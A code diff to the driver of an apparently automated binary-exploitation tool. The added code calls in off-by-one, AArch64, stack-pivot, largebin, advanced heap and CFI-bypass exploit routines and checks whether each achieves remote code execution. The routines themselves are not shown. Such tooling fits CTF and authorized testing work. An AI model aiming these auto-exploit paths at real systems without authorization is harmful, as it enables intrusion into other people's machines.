@@ -32,7 +32,7 @@ from utils.json_output import build_result, write_json, print_json, write_summar
 from utils.writeup import generate_writeup
 from analyzer.seccomp_parser import detect_seccomp_smart
 from analyzer.binary_info import full_binary_info
-from analyzer.libc_fingerprint import resolve_libc_multisym
+from analyzer.libc_fingerprint import resolve_libc_multisym, build_leak_chain_multi, parse_multi_leak
 from analyzer.cache import clear_cache as _clear_cache
 from analyzer.angr_analysis import angr_find_win
 from exploiter import ExploitGenerator, _run_udp_spawn_exploit
@@ -342,7 +342,7 @@ def run_binary(cfg):
 
     # Smart seccomp detection (no seccomp-tools required)
     _seccomp_info = {"has_seccomp": False, "orw_needed": False, "allowed_syscalls": []}
-    if getattr(cfg, "detect_vuln", False) or getattr(cfg, "orw", False):
+    if getattr(cfg, "detect_vuln", False) or getattr(cfg, "force_orw", False):
         with quiet_pwntools():
             _seccomp_info = detect_seccomp_smart(cfg.binary)
         if _seccomp_info["has_seccomp"]:
@@ -440,7 +440,7 @@ def run_binary(cfg):
             from pwn import ELF as _MEL, ROP as _MROP
             _melf = _MEL(cfg.binary, checksec=False)
             _mrop = _MROP(_melf)
-            _chain, _syms = build_leak_chain_multi(_melf, _mrop, offset, canary, n_symbols=3)
+            _chain, _syms = build_leak_chain_multi(_melf, _mrop, offset, None, n_symbols=3)
             if _chain and _syms:
                 _raw = exploiter._send_recv(_chain, timeout=5.0)
                 if _raw:
@@ -465,6 +465,22 @@ def run_binary(cfg):
             log.info(f"[obo] {_obo['type']}: {_obo['notes']}")
             console.print(f"[bold yellow]Off-by-one detected: {_obo['type']} "
                           f"crash_size={_obo['crash_size']}[/]")
+            # Auto-exploit the off-by-one/null
+            try:
+                _obo_chain = exploiter.exploit_off_by_one(
+                    _obo.get("crash_size", offset), base_addr or 0, offsets, lib_version or "2.31")
+                if _obo_chain and cfg.test_exploit:
+                    _obo_ok, _ = exploiter._check_rce(_obo_chain)
+                    if _obo_ok:
+                        print_summary(offset, stack_addr, None, "off_by_one", "Success",
+                                      None, target_function, ["Off-by-one exploit succeeded"],
+                                      nx=nx, pie=pie, relro=relro,
+                                      canary_enabled=canary_enabled, aslr=aslr)
+                        return
+                elif _obo_chain:
+                    log.info(f"[obo] exploit chain built: {len(_obo_chain)}B (use -t to fire)")
+            except Exception as _oe:
+                log.warning(f"[obo] exploit failed: {_oe}")
 
     if getattr(cfg, "multistage", False) and not udp_spawn_mode and not http_spawn_mode and offset is not None:
         log.info("[multistage] Attempting two-stage ret2libc…")
@@ -664,6 +680,22 @@ def run_binary(cfg):
                               canary_enabled=canary_enabled, aslr=aslr)
                 return
 
+    # ── AArch64 specific path ────────────────────────────────────────────────
+    if offset is not None and arch == "aarch64" and not udp_spawn_mode and not http_spawn_mode:
+        log.info("[arm64] AArch64 target — using ARM64 exploit orchestrator…")
+        try:
+            _a64_ok, _a64_type = exploiter.exploit_arm64(
+                offset, canary, base_addr, offsets, aslr, nx)
+            if _a64_ok:
+                log.info(f"[arm64] ✓ RCE via {_a64_type}")
+                print_summary(offset, stack_addr, None, _a64_type, "Success",
+                              canary, target_function, ["AArch64 exploit succeeded"],
+                              nx=nx, pie=pie, relro=relro,
+                              canary_enabled=canary_enabled, aslr=aslr)
+                return
+        except Exception as _a64e:
+            log.warning(f"[arm64] AArch64 orchestrator failed: {_a64e} — continuing standard path")
+
     # ── ret2mprotect force ────────────────────────────────────────────────
     if getattr(cfg, "ret2mprotect", False) and offset is not None and not udp_spawn_mode and not http_spawn_mode:
         log.info("[ret2mprotect] Forcing ret2mprotect strategy…")
@@ -678,6 +710,44 @@ def run_binary(cfg):
                 return
         elif _mp_chain:
             log.info(f"[ret2mprotect] chain built: {len(_mp_chain)}B (use -t to fire)")
+
+    # ── Stack pivot ──────────────────────────────────────────────────────────
+    if getattr(cfg, "stack_pivot", False) and offset is not None and not udp_spawn_mode and not http_spawn_mode:
+        log.info("[stack_pivot] Building leave;ret stack pivot…")
+        try:
+            # build_stack_pivot returns (stage1, rop_chain) or None
+            _sp = exploiter.build_stack_pivot(offset, canary, base_addr or 0, offsets)
+            if _sp and cfg.test_exploit:
+                _sp_ok, _ = exploiter._check_rce(_sp[0])
+                if _sp_ok:
+                    print_summary(offset, stack_addr, None, "stack_pivot", "Success",
+                                  canary, target_function, ["Stack pivot succeeded"],
+                                  nx=nx, pie=pie, relro=relro,
+                                  canary_enabled=canary_enabled, aslr=aslr)
+                    return
+            elif _sp:
+                log.info(f"[stack_pivot] chain built: {len(_sp[0])}B (use -t to fire)")
+        except Exception as _spe:
+            log.warning(f"[stack_pivot] {_spe}")
+
+    # ── Largebin attack ──────────────────────────────────────────────────────
+    if getattr(cfg, "largebin", False) and offset is not None and not udp_spawn_mode and not http_spawn_mode:
+        # largebin_attack self-fires (sends via _send_recv) and returns bool.
+        # Only invoke when -t/--test-exploit is set so dry-runs don't fire.
+        if cfg.test_exploit:
+            log.info("[largebin] Building + firing largebin attack…")
+            try:
+                _lb_ok = exploiter.largebin_attack(offset, base_addr or 0, offsets, lib_version or "2.35")
+                if _lb_ok:
+                    print_summary(offset, stack_addr, None, "largebin_attack", "Success",
+                                  canary, target_function, ["Largebin attack succeeded"],
+                                  nx=nx, pie=pie, relro=relro,
+                                  canary_enabled=canary_enabled, aslr=aslr)
+                    return
+            except Exception as _lbe:
+                log.warning(f"[largebin] {_lbe}")
+        else:
+            log.info("[largebin] largebin_attack auto-fires; pass -t to enable")
 
     fmt_payload = None
     if findings["format_string_functions"] and not udp_spawn_mode and not http_spawn_mode:
@@ -715,6 +785,14 @@ def run_binary(cfg):
         exploiter.create_heap_exploit(offset, base_addr, offsets, lib_version or "2.31")
     if findings["heap_functions"]:
         exploiter.create_uaf_exploit(offset, base_addr, offsets)
+
+    # ── Heap advanced (tcache/FSOP/House of *) ───────────────────────────────
+    if getattr(cfg, "heap_advanced", False) and offset is not None and not udp_spawn_mode and not http_spawn_mode:
+        log.info("[heap_adv] Running advanced heap auto-exploit…")
+        try:
+            exploiter.heap_exploit_auto(offset, canary, base_addr, offsets, lib_version or "2.31")
+        except Exception as _hae:
+            log.warning(f"[heap_adv] {_hae}")
 
     # (dry-run removed: create_exploit is called below with test_exploit flag)
     success, exploit_type, used_function = None, None, None
@@ -810,10 +888,23 @@ def run_binary(cfg):
         log.info(f"[offset] Corrected from shellcode disasm → {_sc_off}")
 
 
-    if cfg.cfi_bypass:
+    if cfg.cfi_bypass and not success:
         cfi_chain = exploiter.cfi_bypass(offset, canary)
         if cfi_chain:
             log.info(f"CFI bypass chain ready: {len(cfi_chain)} bytes")
+            if cfg.test_exploit:
+                try:
+                    _cfi_ok, _ = exploiter._check_rce(cfi_chain)
+                    if _cfi_ok:
+                        log.info("[cfi] ✓ RCE via CFI bypass")
+                        print_summary(offset, stack_addr, None, "cfi_bypass", "Success",
+                                      canary, target_function, ["CFI bypass succeeded"],
+                                      nx=nx, pie=pie, relro=relro,
+                                      canary_enabled=canary_enabled, aslr=aslr)
+                        success = True
+                        exploit_type = "cfi_bypass"
+                except Exception as _ce:
+                    log.warning(f"[cfi] send failed: {_ce}")
 
     if platform == "windows":
         if cfg.safeseh_bypass:
@@ -1049,6 +1140,8 @@ def main():
         cfg.debug           = getattr(args, "debug", False)
         cfg.menu_script     = getattr(args, "menu_script", None)
         cfg.pre_send        = getattr(args, "pre_send", None)
+        cfg.win_names       = getattr(args, "win_names", "")
+        cfg.gdb_mode        = getattr(args, "gdb_mode", "pwndbg")
         log = setup_logging(cfg.log_file)
         try:
             cfg.validate()
